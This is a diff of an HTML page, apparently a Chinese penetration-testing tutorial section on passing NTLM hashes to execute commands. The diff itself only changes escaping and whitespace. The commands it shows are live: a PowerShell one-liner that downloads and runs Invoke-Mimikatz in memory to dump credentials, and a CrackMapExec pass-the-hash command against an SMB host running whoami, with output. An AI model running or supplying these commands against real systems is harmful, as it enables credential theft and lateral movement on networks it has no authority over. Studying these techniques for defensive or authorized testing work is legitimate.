@@ -122,10 +122,9 @@ pip install crackmapexec
 </code></pre><h2 id="0x04-传递ntlm-hash执行命令">0x04 传递NTLM Hash执行命令</h2>
 <h3 id="使用mimikatz获取ntlm-hash">使用<code>Mimikatz</code>获取<code>NTLM Hash</code></h3>
 <pre tabindex="0"><code>
-PS C:\Users\administrator\Documents&gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+PS C:\Users\administrator\Documents&gt;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;)
 
 PS C:\Users\administrator\Documents&gt;Invoke-Mimikatz
-
 </code></pre><p>获取NTLM Hash</p>
 <pre tabindex="0"><code>****
         msv :
@@ -151,7 +150,6 @@ PS C:\Users\administrator\Documents&gt;Invoke-Mimikatz
         credman :
 
 ****
-
 </code></pre><h3 id="使用crackmapexec执行命令">使用<code>CrackMapExec</code>执行命令</h3>
 <pre tabindex="0"><code>root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
 SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
